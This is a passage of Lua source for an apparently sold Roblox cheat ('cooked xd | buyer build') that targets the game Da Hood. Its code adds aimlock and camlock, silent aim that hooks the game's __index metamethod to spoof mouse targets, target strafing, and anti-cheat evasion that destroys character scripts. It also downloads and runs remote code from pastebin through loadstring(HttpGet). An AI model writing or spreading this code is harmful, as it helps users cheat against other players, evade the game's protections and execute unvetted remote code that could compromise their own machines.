    gui.LocalScript_2.Name = ""LocalScript""
    gui.LocalScript_2.Parent = gui.TextLabel_1
    
    gui.Frame_2.BorderSizePixel = 0
    gui.Frame_2.Size = UDim2.new(0, 323, 0, 2)
    gui.Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.Frame_2.Name = ""Frame""
    gui.Frame_2.BackgroundColor3 = Color3.fromRGB(227, 181, 200)
    gui.Frame_2.Parent = gui.Frame
    
    gui.TextLabel_2.TextStrokeTransparency = 0
    gui.TextLabel_2.BorderSizePixel = 0
    gui.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    gui.TextLabel_2.Font = Enum.Font.Code
    gui.TextLabel_2.TextSize = 18
    gui.TextLabel_2.Position = UDim2.new(0.321981, 0, 4.07144, 0)
    gui.TextLabel_2.Size = UDim2.new(0, 200, 0, 43)
    gui.TextLabel_2.Name = ""TextLabel""
    gui.TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
    gui.TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    gui.TextLabel_2.Text = ""nil""
    gui.TextLabel_2.BackgroundTransparency = 1
    gui.TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
    gui.TextLabel_2.Parent = gui.Frame_2
    
    gui.LocalScript_3.Name = ""LocalScript""
    gui.LocalScript_3.Parent = gui.TextLabel_2
    
    gui.UIGradient.Name = ""UIGradient""
    gui.UIGradient.Color = ColorSequence.new{ ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 50)), ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 170, 170)) }
    gui.UIGradient.Rotation = 270
    gui.UIGradient.Parent = gui.Frame
    
    gui.Shadow.ImageColor3 = Color3.fromRGB(14, 14, 14)
    gui.Shadow.ZIndex = 0
    gui.Shadow.SliceCenter = Rect.new(18, 18, 20, 20)
    gui.Shadow.ScaleType = Enum.ScaleType.Slice
    gui.Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    gui.Shadow.Image = ""http://www.roblox.com/asset/?id=12194054034""
    gui.Shadow.Size = UDim2.new(1, 20, 1, 20)
    gui.Shadow.Name = ""Shadow""
    gui.Shadow.BackgroundTransparency = 1
    gui.Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    gui.Shadow.Parent = gui.Frame
    
    gui.Gradient.Name = ""Gradient""
    gui.Gradient.Rotation = 90
    gui.Gradient.Parent = gui.Shadow
    gui.Frame.Visible = false
    
        for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA(""Script"") and v.Name ~= ""Health"" and v.Name ~= ""Sound"" and v:FindFirstChild(""LocalScript"") then
                v:Destroy()
            end
        end
        game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
            repeat
                wait()
            until game.Players.LocalPlayer.Character
            char.ChildAdded:Connect(function(child)
                if child:IsA(""Script"") then 
                    wait(0.1)
                    if child:FindFirstChild(""LocalScript"") then
                        child.LocalScript:FireServer()
                    end
                end
            end)
        end) 
                
    
                 local Player = game:GetService(""Players"")[""LocalPlayer""];
     
         Player[""CharacterAdded""]:connect(function(v)
             repeat wait() until v and v:FindFirstChild(""Humanoid"")
         for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
             if v:IsA(""Script"") and v.Name ~= ""Health"" and v.Name ~= ""Sound"" and v:FindFirstChild(""LocalScript"") then
                 v:Destroy()
             end
         end
         game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
             repeat
                 wait()
             until game.Players.LocalPlayer.Character
             char.ChildAdded:Connect(function(child)
                 if child:IsA(""Script"") then 
                     wait(0.1)
                     if child:FindFirstChild(""LocalScript"") then
                         child.LocalScript:FireServer()
                     end
                 end
             end)
         end)
         end)
    
    
         getgenv().AimPart = ""HumanoidRootPart"" 
    getgenv().OldAimPart = ""HumanoidRootPart""
    getgenv().AimlockKey = ""q""
    getgenv().AimRadius = 5
    getgenv().ThirdPerson = true 
    getgenv().FirstPerson = true
    getgenv().TeamCheck = false 
    getgenv().PredictMovement = false
    getgenv().PredictionVelocity = 7.22
    
    getgenv().Smoothness = false
    getgenv().SmoothnessAmount = 1
    getgenv().EasingStyle = Enum.EasingStyle.Elastic
    
    getgenv().Notifications = false
    
    getgenv().AutoPrediction = false
    getgenv().UnlockOnDeath = false
    getgenv().Shake = false
    getgenv().ShakePower = 0
    
    local Players, Uis, RService, SGui = game:GetService""Players"", game:GetService""UserInputService"", game:GetService""RunService"", game:GetService""StarterGui"";
    local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
    local Aimlock, MousePressed, CanNotify = true, false, false;
    local AimlockTarget
    local OldPre;
    
    
    
    getgenv().WorldToViewportPoint = function(P)
        return Camera:WorldToViewportPoint(P)
    end
    
    getgenv().WorldToScreenPoint = function(P) 
        return Camera.WorldToScreenPoint(Camera, P)
    end
    
    getgenv().GetObscuringObjects = function(T)
        if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild(""Head"") then 
            local RayPos = workspace:FindPartOnRay(RNew(
                T[getgenv().AimPart].Position, Client.Character.Head.Position)
            )
            if RayPos then return RayPos:IsDescendantOf(T) end
        end
    end
    
    getgenv().GetNearestTarget = function()
        local players = {}
        local PLAYER_HOLD  = {}
        local DISTANCES = {}
        for i, v in pairs(Players:GetPlayers()) do
            if v ~= Client then
                table.insert(players, v)
            end
        end
        for i, v in pairs(players) do
            if v.Character ~= nil then
                local AIM = v.Character:FindFirstChild(""Head"")
                if getgenv().TeamCheck == true and v.Team ~= Client.Team then
                    local DISTANCE = (v.Character:FindFirstChild(""Head"").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
                    local DISTANCE = (v.Character:FindFirstChild(""Head"").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                    local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                    local DIFF = math.floor((POS - AIM.Position).magnitude)
                    PLAYER_HOLD[v.Name .. i] = {}
                    PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                    PLAYER_HOLD[v.Name .. i].plr = v
                    PLAYER_HOLD[v.Name .. i].diff = DIFF
                    table.insert(DISTANCES, DIFF)
                end
            end
        end
        
        if unpack(DISTANCES) == nil then
            return nil
        end
        
        local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
        if L_DISTANCE > getgenv().AimRadius then
            return nil
        end
        
        for i, v in pairs(PLAYER_HOLD) do
            if v.diff == L_DISTANCE then
                return v.plr
            end
        end
        return nil
    end
    
    
    
    RService.RenderStepped:Connect(function()
        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then 
            if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
                CanNotify = true 
            else 
                CanNotify = false 
            end
        end
        if Aimlock == true and MousePressed == true then 
            if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) then 
                if getgenv().FirstPerson == true then
                    if CanNotify == true then
                        if getgenv().PredictMovement == true then
                            if getgenv().Smoothness == true then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                                
                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                            end
                        elseif getgenv().PredictMovement == false then 
                            if getgenv().Smoothness == true then
                                --// The part we're going to lerp/smoothen \\--
                                local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
    
                                --// Making it work \\--
                                Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                            else
                                Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                            end
                        end
                    end
                end
            end
        end
       if getgenv().UnlockOnDeath  == true and AimlockTarget and AimlockTarget.Character:FindFirstChild(""Humanoid"") then
        if AimlockTarget.StarterPlayer.StarterCharacterScripts.BodyEffects['K.O'] then
            AimlockTarget = nil
            
            if getgenv().Notifications == true then
                Notify({
                    Title = BlazedName,
                    Description = ""Unlocked"",
                    Duration = 1
                })
            end
            if getgenv().ChatNotis == true then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""Unlocked"",""All"")
            end
        end
    end
    
                if getgenv().Shake == true and AimlockTarget and AimlockTarget.Character then
                    local Main = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity +
                    Vector3.new(
                        math.random(-getgenv().ShakePower, getgenv().ShakePower),
                        math.random(-getgenv().ShakePower, getgenv().ShakePower),
                        math.random(-getgenv().ShakePower, getgenv().ShakePower)
                    ) * 0.1)
                    Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().SmoothnessAmount, getgenv().EasingStyle , Enum.EasingDirection.InOut)
                end
    
       if getgenv().AutoPrediction == true then
        pingvalue = game:GetService(""Stats"").Network.ServerStatsItem[""Data Ping""]:GetValueString()
        split = string.split(pingvalue,'(')
        ping = tonumber(split[1])
    if ping < 30 then
        getgenv().PredictionVelocity = 7.758
    elseif ping < 40 then
        getgenv().PredictionVelocity = 7.364
    elseif ping < 50 then
        getgenv().PredictionVelocity = 7.456 
    elseif ping < 60 then
        getgenv().PredictionVelocity = 7.217
    elseif ping < 70 then
        getgenv().PredictionVelocity = 6.972 
    elseif ping < 80 then
        getgenv().PredictionVelocity = 6.782
    elseif ping < 90 then
        getgenv().PredictionVelocity = 6.597 
    elseif ping < 100 then
        getgenv().PredictionVelocity = 3.88
    elseif ping < 110 then
        getgenv().PredictionVelocity = 6.099
    end
    end
    
    end)
    
    
    
    local repo = 'https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/'
    local Library = loadstring(game:HttpGet('https://pastebin.com/raw/7Tk5QM6R'))()
    local ThemeManager = loadstring(game:HttpGet('https://pastebin.com/raw/WxMCy9be'))()
    local SaveManager = loadstring(game:HttpGet('https://pastebin.com/raw/rNY1ZdQT'))()
    
    local Window = Library:CreateWindow({
        Title = 'cooked xd | buyer build',
        Center = true, 
        AutoShow = true,
        Size = UDim2.fromOffset(550, 560),
        TabPadding = 4,
    })
    
    
    
    local Tabs = {
        Main = Window:AddTab('Legit'), 
        Rage = Window:AddTab('Rage'), 
        Visuals = Window:AddTab('Visuals'), 
        Misc = Window:AddTab('Misc'), 
        ['Settings'] = Window:AddTab('Settings'),
    }
    

    local LeftGroupBox = Tabs.Main:AddLeftGroupbox('Camlock')
    local Shakebox =Tabs.Main:AddLeftGroupbox('Shake')
    local SmoothBox = Tabs.Main:AddLeftGroupbox('Smoothing')
    local SilentAim = Tabs.Main:AddRightGroupbox('Silent Aim')
    local SilentVisuals = Tabs.Main:AddRightGroupbox('FOV')
    
    
    
    LeftGroupBox:AddToggle('Aimlock', {
        Text = 'Enable',
        Default = false, 
        Tooltip = 'Enables Aimlock', 
    })
    
    Toggles.Aimlock:OnChanged(function()
        getgenv().AimlockEnabled = Toggles.Aimlock.Value
    end)
    
    
    Toggles.Aimlock:AddKeyPicker('AimlockBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Enable', 
        NoUI = false,
    })
    Options.AimlockBind:OnClick(function()
    if AimlockEnabled then 
        Target = not Target
        --
        if AimlockTarget then
            AimlockTarget = nil
            MousePressed = false
            if getgenv().Notifications then
                Notifications(""Unlocked"")
            end
        else
            if AimlockTarget == nil then
                local Target;Target = GetNearestTarget()
                if Target ~= nil then 
                    AimlockTarget = Target
                    if getgenv().Notifications then
                        notifications:BuildNotificationUI();
                        Notifications(""Locked Onto""..tostring(Aimlock));
                    end
                    MousePressed = true
                end
            end
        end
            end
    end)
    
    LeftGroupBox:AddInput('CamPrediction', {
        Default = '7.22',
        Numeric = true, 
        Finished = false,
        Text = 'Prediction',
        Tooltip = 'Example: 7.22', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().PredictionVelocity = int
            notifications:BuildNotificationUI();
            Notifications(""Prediction Changed To: ""..tostring(int));
            end 
    })
    
    LeftGroupBox:AddToggle('CamPingBased', {
        Text = 'Ping Based',
        Default = false, 
        Tooltip = 'Autos Configures Prediction', 
    })
    
    Toggles.CamPingBased:OnChanged(function()
        getgenv().AutoPrediction = Toggles.CamPingBased.Value
    end)
    
    LeftGroupBox:AddDropdown('CamHitpart', {
        Values = { 'HumanoidRootPart', 'UpperTorso', 'LowerTorso', 'Head' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Hitpart',
        Tooltip = 'Where your bullets will hit', -- Information shown when you hover over the textbox
    })
    
    Options.CamHitpart:OnChanged(function()
        getgenv().AimPart = Options.CamHitpart.Value
    end)
    
    LeftGroupBox:AddToggle('CamAlerts', {
        Text = 'Notifications',
        Default = false, 
        Tooltip = 'Notifys Locking/Unlocking', 
    })
    
    Toggles.CamAlerts:OnChanged(function()
        getgenv().Notifications = Toggles.CamAlerts.Value
    end)
    
    
    
    LeftGroupBox:AddToggle('CamUnOnD', {
        Text = 'Unlock On Death',
        Default = false, 
        Tooltip = 'Automatically Unlocks Target On KO', 
    })
    
    Toggles.CamUnOnD:OnChanged(function()
        getgenv().UnlockOnDeath = Toggles.CamUnOnD.Value
    end)
    
    Shakebox:AddToggle('CamShake', {
        Text = 'Shake',
        Default = false, 
        Tooltip = 'Shakes On The Target', 
    })
    
    Toggles.CamShake:OnChanged(function()
        getgenv().Shake = Toggles.CamShake.Value
    end)
    
    
    Shakebox:AddInput('CamShakePower', {
        Default = '5',
        Numeric = true, 
        Finished = false,
        Text = 'Shake Power',
        Tooltip = 'Ex: 5', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().ShakePower = int
            notifications:BuildNotificationUI();
            Notifications(""Shake Power Changed To: ""..tostring(int));
            end 
    })
    
    SmoothBox:AddToggle('CamSmoothness', {
        Text = 'Smoothness',
        Default = false, 
        Tooltip = 'Smoothens Camlock', 
    })
    
    Toggles.CamSmoothness:OnChanged(function()
        getgenv().Smoothness = Toggles.CamSmoothness.Value
    end)
    
    SmoothBox:AddInput('CamSmoothnessPWR', {
        Default = '1',
        Numeric = true, 
        Finished = false,
        Text = 'Smoothness Power',
        Tooltip = 'Ex: 0.52', 
        Placeholder = '...', 
        Callback = function(int)
            getgenv().SmoothnessAmount = int
            notifications:BuildNotificationUI();
            Notifications(""Smoothness Power Changed To: ""..tostring(int));
            end, 0.01
    })
    

    --
    -- Original link : https://github.com/Stefanuk12/ROBLOX/blob/master/Games/Da%20Hood/SilentAimAimLock.lua
-- reuploaded so it will be still alive if removed
getgenv().SilentAim = true -- true or false
getgenv().AimLock = false -- true or false
getgenv().Prediction = 0.13544 -- Prediction of Silent Aim and AimLock
getgenv().AimLockKeybind = Enum.KeyCode.E -- Keybind for AIMLOCK (NOT SILENT AIM)

-- // Dependencies
local Aiming = loadstring(game:HttpGet(""https://pastebin.com/raw/KzV8GRHk""))()
Aiming.TeamCheck(false)
Aiming.ShowFOV = false

-- // Services
local Workspace = game:GetService(""Workspace"")
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")

-- // Vars
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = Workspace.CurrentCamera

local DaHoodSettings = {
    SilentAim = getgenv().SilentAim,
    AimLock = getgenv().AimLock,
    Prediction = getgenv().Prediction,
    AimLockKeybind = Enum.KeyCode.E
}
getgenv().DaHoodSettings = DaHoodSettings

-- // Overwrite to account downed
function Aiming.Check()
    -- // Check A
    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
        return false
    end

    -- // Check if downed
    local Character = Aiming.Character(Aiming.Selected)
    local KOd = Character:WaitForChild(""BodyEffects"")[""K.O""].Value
    local Grabbed = Character:FindFirstChild(""GRABBING_CONSTRAINT"") ~= nil

    -- // Check B
    if (KOd or Grabbed) then
        return false
    end

    -- //
    return true
end


-- // Hook 
local __index
__index = hookmetamethod(game, ""__index"", function(t, k)
    -- // Check if it trying to get our mouse's hit or target and see if we can use it
    if (t:IsA(""Mouse"") and (k == ""Hit"" or k == ""Target"") and Aiming.Check()) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit/Target
        if (DaHoodSettings.SilentAim and (k == ""Hit"" or k == ""Target"")) then
            -- // Hit to account prediction
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

            -- // Return modded val
            return (k == ""Hit"" and Hit or SelectedPart)
        end
    end

    -- // Return
    return __index(t, k)
end)
--[[ LURAPH HOOK

if not LPH_OBFUSCATED then
    getfenv().LPH_NO_VIRTUALIZE = function(f) return f end;
    end

   local Old
    Old = hookmetamethod(game, ""__index"", LPH_NO_VIRTUALIZE(function(self, k)
    -- // Check if it trying to get our mouse's hit or target and see if we can use it
    if (t:IsA(""Mouse"") and (k == ""Hit"" or k == ""Target"") and Aiming.Check()) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit/Target
        if (DaHoodSettings.SilentAim and (k == ""Hit"" or k == ""Target"")) then
            -- // Hit to account prediction
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

            -- // Return modded val
            return (k == ""Hit"" and Hit or SelectedPart)
        end
    end

    -- // Return
    return Old(self, k) 
end))
]]

-- // Aimlock
RunService:BindToRenderStep(""AimLock"", 0, function()
    if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
        -- // Vars
        local SelectedPart = Aiming.SelectedPart

        -- // Hit to account prediction
        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)

        -- // Set the camera to face towards the Hit
        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
    end
end)



--
    
    SilentAim:AddToggle('SilentAimt', {
        Text = 'Enable',
        Default = false, 
        Tooltip = 'Enables Silent Aim', 
    })
    
    Toggles.SilentAimt:OnChanged(function()
        --Aiming.Enabled = Toggles.SilentAimt.Value
    end)

    SilentAim:AddInput('Prediction', {
        Default = '0.13544',
        Numeric = true, 
        Finished = false,
        Text = 'Prediction',
        Tooltip = 'Example: 0.13544', 
        Placeholder = '...', 
        Callback = function(int2)
            getgenv().Prediction = int2
        end
    })
    
    SilentAim:AddToggle('SAPingBased', {
        Text = 'Ping Based',
        Default = false, 
        Tooltip = 'Autos Configures Prediction', 
    })
    
    Toggles.SAPingBased:OnChanged(function()
        getgenv().saPingBased = Toggles.SAPingBased.Value
    end)

    SilentAim:AddSlider('saHitchance', {
        Text = 'Hitchance',
        Default = 100,
        Min = 0,
        Max = 300,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.saHitchance:OnChanged(function()
        Aiming.Hitchance = Options.saHitchance.Value
    end)

    SilentAim:AddDropdown('SilentHitpart', {
        Values = { 'HumanoidRootPart', 'UpperTorso', 'LowerTorso', 'Head' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Aimpart',
        Tooltip = 'Where Your Bullets Hit', -- Information shown when you hover over the textbox
    })
    
    Options.SilentHitpart:OnChanged(function()
        Aiming.TargetPart  = Options.SilentHitpart.Value
    end)

    SilentAim:AddToggle('saToggleNoti', {
        Text = 'Silent Aim Toggle',
        Default = false, 
        Tooltip = 'Toggles The Silent Aim', 
    })
    
    Toggles.saToggleNoti:OnChanged(function()
        getgenv().saToggleNoti = Toggles.saToggleNoti.Value
    end)

    SilentAim:AddToggle('saToggleNoti', {
        Text = 'Toggle Notifications',
        Default = false, 
        Tooltip = 'Notifiys On Toggle', 
    })
    
    Toggles.saToggleNoti:OnChanged(function()
        getgenv().ToggleSilent = Toggles.saToggleNoti.Value
    end)
    
    
    Toggles.saToggleNoti:AddKeyPicker('saToggleBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Enable', 
        NoUI = false,
    })
    Options.saToggleBind:OnClick(function()
        if ToggleSilent then
            if Aiming.Enabled == true then
                Aiming.Enabled = false      
                    if saToggleNoti then
                        Notifications(""Silent Aim Enabled"")
                    end
            else
                Aiming.Enabled = true
                if saToggleNoti then
                    Notifications(""Silent Aim Disabled"")
                end
            end
        end
    end)

    SilentVisuals:AddToggle('FOVEnabled', {
        Text = 'Enable',
        Default = false, 
        Tooltip = 'Adds A Circle To Your Screen (fov = radius)', 
    })
    
    Toggles.FOVEnabled:OnChanged(function()
        Aiming.ShowFOV = Toggles.FOVEnabled.Value
    end)

    SilentVisuals:AddToggle('FOVFilled', {
        Text = 'Filled',
        Default = false, 
        Tooltip = 'Fills the FOV', 
    })
    
    Toggles.FOVFilled:OnChanged(function()
        Aiming.Filled = Toggles.FOVFilled.Value
    end)
    
    
    
    Toggles.FOVEnabled:AddColorPicker('FOVColor', {
        Default = Color3.fromRGB(255,255,255),
        Title = 'Color'
    })
    
    Options.FOVColor:OnChanged(function()
        Aiming.FOVColour  = Options.FOVColor.Value
    end)

    SilentVisuals:AddDivider()

    SilentVisuals:AddSlider('FOVRadius', {
        Text = 'Size',
        Default = 100,
        Min = 3,
        Max = 250,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.FOVRadius:OnChanged(function()
        Aiming.FOV = Options.FOVRadius.Value
    end)

    SilentVisuals:AddSlider('FOVSides', {
        Text = 'Sides',
        Default = 100,
        Min = 3,
        Max = 250,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.FOVSides:OnChanged(function()
        Aiming.FOVSides = Options.FOVSides.Value
    end)

    SilentVisuals:AddDivider()

    SilentVisuals:AddSlider('FOVTransparency', {
        Text = 'Transparency',
        Default = 1,
        Min = 0.1,
        Max = 1,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.FOVTransparency:OnChanged(function()
        Aiming.Transparency = Options.FOVTransparency.Value
    end)

    SilentVisuals:AddSlider('FOVThickness', {
        Text = 'Thickness',
        Default = 2,
        Min = 1,
        Max = 10,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.FOVThickness:OnChanged(function()
        Aiming.Thickness  = Options.FOVThickness.Value
    end)


    --
    
    local RightGroupBox = Tabs.Rage:AddLeftGroupbox('Target Aim')
    local Strafe = Tabs.Rage:AddLeftGroupbox('Target Strafe')
    
    RightGroupBox:AddToggle('TargetAim', {
        Text = 'Enable',
        Default = false, 
        Tooltip = 'Enables Aimlock', 
    })
    
    Toggles.TargetAim:OnChanged(function()
        Lock.Enabled = Toggles.TargetAim.Value
    end)
    
    
    
    Toggles.TargetAim:AddKeyPicker('TargetBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Target Aim', 
        NoUI = false,
    })
    
    RightGroupBox:AddDropdown('TargetMode', {
        Values = { 'Target Aim', 'Silent Aim' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Mode',
        Tooltip = 'Target Aim Mode', -- Information shown when you hover over the textbox
    })
    
    Options.TargetMode:OnChanged(function()
        Lock.Mode = Options.TargetMode.Value
    end)
    
    RightGroupBox:AddToggle('TargetResolver', {
        Text = 'Resolver',
        Default = false, 
        Tooltip = 'Disables Anti Locks/Anti Aims', 
    })
    
    Toggles.TargetResolver:OnChanged(function()
        Lock.Resolver = Toggles.TargetResolver.Value
    end)
    
    -- 
    RightGroupBox:AddInput('MyTextbox', {
        Default = '0.09',
        Numeric = true, 
        Finished = false,
        Text = 'Prediction',
        Tooltip = 'Prediction', 
        Placeholder = '0.09', 
        Callback = function(int)
            Lock.Target.Prediction = int
            notifications:BuildNotificationUI();
            Notifications(""Prediction Changed To: ""..tostring(int));
            end 
    })
    
    RightGroupBox:AddSlider('TargetRadius', {
        Text = 'Radius',
        Default = 50,
        Min = 5,
        Max = 200,
        Rounding = 2,
        Compact = true, 
    })
    
    Options.TargetRadius:OnChanged(function()
        Lock.Drawings.FOV.Radius = Options.TargetRadius.Value
    end)
    
    
    
    RightGroupBox:AddToggle('TargetNotis', {
        Text = 'Notifications',
        Default = false, 
        Tooltip = 'Notifys On Enabled/Disabled', 
    })
    
    Toggles.TargetNotis:OnChanged(function()
        Lock.Visualize.Notify = Toggles.TargetNotis.Value
    end)
    
    RightGroupBox:AddToggle('TargetPingBased', {
        Text = 'Ping Based',
        Default = false, 
        Tooltip = 'Auto Configs Prediction', 
    })
    
    Toggles.TargetPingBased:OnChanged(function()
        Lock.Prediction.PingBased = Toggles.TargetPingBased.Value
    end)
    
    RightGroupBox:AddToggle('TargetAirPred', {
        Text = 'Air Prediction',
        Default = false, 
        Tooltip = 'Predicts Airshots', 
    })
    
    Toggles.TargetAirPred:OnChanged(function()
        Lock.Prediction.Air = Toggles.TargetAirPred.Value
    end)
    
    
    RightGroupBox:AddDropdown('TargetAimpart', {
        Values = { 'HumanoidRootPart', 'UpperTorso', 'LowerTorso', 'Head' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Aimpart',
        Tooltip = 'Where Your Bullets Hit', -- Information shown when you hover over the textbox
    })
    
    Options.TargetAimpart:OnChanged(function()
        Lock.Prediction.Part = Options.TargetAimpart.Value
    end)
    
    RightGroupBox:AddToggle('TargetLookAt', {
        Text = 'Look At',
        Default = false, 
        Tooltip = 'Looks At Your Target', 
    })
    
    Toggles.TargetLookAt:OnChanged(function()
        Lock.LookAt = Toggles.TargetLookAt.Value
    end)
    
    RightGroupBox:AddToggle('TargetViewAt', {
        Text = 'View At',
        Default = false, 
        Tooltip = 'Views Your Target', 
    })
    
    Toggles.TargetViewAt:OnChanged(function()
        Lock.ViewAt = Toggles.TargetViewAt.Value
    end)
    
    
    
    RightGroupBox:AddSlider('TargetOffset', {
        Text = 'Offset',
        Default = 0.06,
        Min = -0.5,
        Max = 0.5,
        Rounding = 2,
        Compact = true, 
    })
    
    Options.TargetOffset:OnChanged(function()
        getgenv().offset = Options.TargetOffset.Value
    end)
    
    
    
    -- Add Tabbox on right side
    
    
    
    
    
    Strafe:AddToggle('TargetStrafe', {
        Text = 'Target Strafe',
        Default = false, 
        Tooltip = 'Strafes Around Your Target', 
    })
    
    Toggles.TargetStrafe:OnChanged(function()
        Lock.Target_Strafe[1] = Toggles.TargetStrafe.Value
    end)
    
    Strafe:AddToggle('StrafeRotation', {
        Text = 'Visualize Rotation',
        Default = false, 
        Tooltip = 'Visualizes Strafe Rotation', 
    })
    
    Toggles.StrafeRotation:OnChanged(function()
        Lock.Visualize.Strafe = Toggles.StrafeRotation.Value
    end)
    
    
    
    Toggles.StrafeRotation:AddColorPicker('VisualizeRotationColor', {
        Default = Color3.new(0, 1, 0), -- Bright green
        Title = 'Visualize Rotation', -- Optional. Allows you to have a custom color picker title (when you open it)
        Transparency = 1, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    })
    

    --Lock.Drawings.FakeHitbox.Material = Enum.Material[Option]
    
    Strafe:AddSlider('StrafeSpeed', {
        Text = 'Speed',
        Default = 5,
        Min = 1,
        Max = 20,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.StrafeSpeed:OnChanged(function()
        Lock.Target_Strafe[2] = Options.StrafeSpeed.Value
    end)
    
    Strafe:AddSlider('StrafeRadius', {
        Text = 'Radius',
        Default = 5,
        Min = 1,
        Max = 20,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.StrafeRadius:OnChanged(function()
        Lock.Target_Strafe[3] = Options.StrafeRadius.Value
    end)
    
    
    Strafe:AddSlider('StrafeHeight', {
        Text = 'Height',
        Default = 5,
        Min = 0,
        Max = 20,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.StrafeHeight:OnChanged(function()
        Lock.Target_Strafe[4] = Options.StrafeHeight.Value
    end)
    
    local Misc = Tabs.Misc:AddLeftGroupbox('Player')
